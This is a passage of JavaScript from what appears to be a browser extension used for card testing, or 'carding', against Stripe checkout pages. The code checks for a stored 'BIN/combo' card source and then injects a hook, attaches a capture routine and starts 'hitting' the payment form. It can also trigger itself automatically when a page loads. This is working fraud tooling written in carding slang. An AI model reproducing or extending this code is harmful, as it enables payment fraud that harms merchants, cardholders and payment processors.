      chrome.storage.local.get("nonoStripePending", (res) => {
        if (res && res.nonoStripePending) {
          chrome.storage.local.remove("nonoStripePending");
          const st = document.getElementById("nono-stripe-status");
          if (st) { st.textContent = "pending — hitting…"; st.style.color = "#635bff"; }
          setTimeout(async () => {
            const cfg2 = await getConfig();
            if (!hasCardSource(cfg2)) {
              if (st) st.textContent = "need BIN/combo on the panel";
              logMsg("Stripe link open — fill the card inputs above then hit START / OPEN + HIT, Chief.");
              return;
            }
            injectHook();
            attachCapture();
            startHit();
          }, 3500);
        }
      });
      if (cfg.enabled && cfg.autoOnLoad && !autoScheduled) {
        autoScheduled = true;
        setTimeout(() => {
          const b = document.getElementById("nono-start");
          if (b) b.click();
        }, 1800);
      }
    }
  }

  setTimeout(init, 700);
})();